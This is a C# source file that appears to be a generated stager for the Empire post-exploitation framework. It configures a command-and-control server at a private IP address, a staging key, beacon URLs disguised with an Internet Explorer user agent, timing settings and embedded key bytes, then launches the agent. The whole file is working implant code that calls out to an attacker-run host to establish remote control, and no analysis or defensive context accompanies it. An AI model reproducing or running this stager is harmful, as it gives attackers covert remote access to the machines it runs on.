using System;
using Sharpire;

public static class Program
{
    public static void Main()
    {
        try
        {
            string profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
            string address = "http://192.168.245.163:85";
            string stagingkey = "vCBRYnq9srTlIYRry2L3twFvcJcKKYBc";
            string workinghours = "";
            string killdate = "";
            uint delay = 5;
            double jitter = 0;
            uint lostlimit = 10;
            string agentlanguage = "dotnet";
            string[] arguments = { address, stagingkey, agentlanguage };
            string defaultResponse = "";
            byte[] pk = new byte[] { 0xb6, 0xe2, 0x75, 0x47, 0x3d, 0xf3, 0x9a, 0xe4, 0x8f, 0xa0, 0x20, 0x84, 0x79, 0x15, 0xda, 0x91, 0x3e, 0xd4, 0x1f, 0x0f, 0xb1, 0xe6, 0x07, 0x4d, 0x41, 0xe5, 0x7e, 0xa3, 0x6b, 0xda, 0x40, 0x65 };
            byte[] skbytes = new byte[] { 0x62, 0x54, 0x8a, 0x0f, 0xee, 0x84, 0xfa, 0x55, 0x69, 0xb7, 0x8c, 0xf2, 0x94, 0x6f, 0xda, 0xd5, 0xa1, 0xf6, 0x42, 0x58, 0x23, 0xba, 0x49, 0x92, 0x32, 0x74, 0x13, 0xfe, 0xec, 0xbd, 0x35, 0xe9 };

            SessionInfo sessionInfo = new SessionInfo(arguments);
            sessionInfo.SetWorkingHours(workinghours);
            sessionInfo.SetKillDate(killdate);
            sessionInfo.SetDefaultJitter(jitter);
            sessionInfo.SetDefaultDelay(delay);
            sessionInfo.SetDefaultLostLimit(lostlimit);
            sessionInfo.SetDefaultResponse(defaultResponse);
            sessionInfo.SetProfile(profile);
            sessionInfo.SetPrivateKeyBytes(skbytes);
            sessionInfo.SetPublicKeyBytes(pk);


            (new EmpireStager(sessionInfo)).Execute();
        }
        catch (Exception e) { Console.WriteLine(e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace); }
    }
}